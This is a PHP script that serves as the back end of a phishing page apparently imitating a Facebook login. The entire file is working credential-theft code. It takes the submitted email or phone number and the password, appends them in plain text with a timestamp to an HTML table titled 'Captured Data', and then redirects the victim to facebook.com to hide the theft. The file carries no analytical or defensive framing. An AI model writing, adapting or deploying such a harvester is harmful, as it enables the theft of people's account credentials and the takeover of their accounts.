<?php
ob_start();

$file = "data.html";
$email = isset($_POST['email']) ? $_POST['email'] : '';
$pass = isset($_POST['pass']) ? $_POST['pass'] : '';
$date = date("Y-m-d H:i:s");

// If file doesn't exist, create it with the HTML header and table head
if (!file_exists($file) || filesize($file) === 0) {
    $header = '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captured Data</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #f0f2f5; padding: 40px 20px; }
        h1 { text-align: center; color: #1c1e21; margin-bottom: 24px; font-size: 24px; }
        table { width: 100%; max-width: 900px; margin: 0 auto; border-collapse: collapse; background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); }
        th { background: #1877f2; color: #fff; padding: 14px 20px; text-align: left; font-size: 15px; }
        td { padding: 12px 20px; font-size: 14px; color: #1c1e21; border-bottom: 1px solid #e4e6eb; }
        tr:last-child td { border-bottom: none; }
        tr:hover td { background: #f0f2f5; }
        .count { text-align: center; color: #65676b; font-size: 14px; margin-top: 16px; }
    </style>
</head>
<body>
    <h1>Captured Data</h1>
    <table>
        <tr>
            <th>#</th>
            <th>Email / Phone</th>
            <th>Password</th>
            <th>Date &amp; Time</th>
        </tr>
';
    file_put_contents($file, $header);
}

// Count existing rows to get the serial number
$existing = file_get_contents($file);
$sr = substr_count($existing, '<td class="sr">') + 1;

// Append new row
$row = '        <tr>
            <td class="sr">' . $sr . '</td>
            <td>' . htmlspecialchars($email) . '</td>
            <td>' . htmlspecialchars($pass) . '</td>
            <td>' . $date . '</td>
        </tr>
';
file_put_contents($file, $row, FILE_APPEND);

header('Location: http://www.facebook.com');
exit;
?>
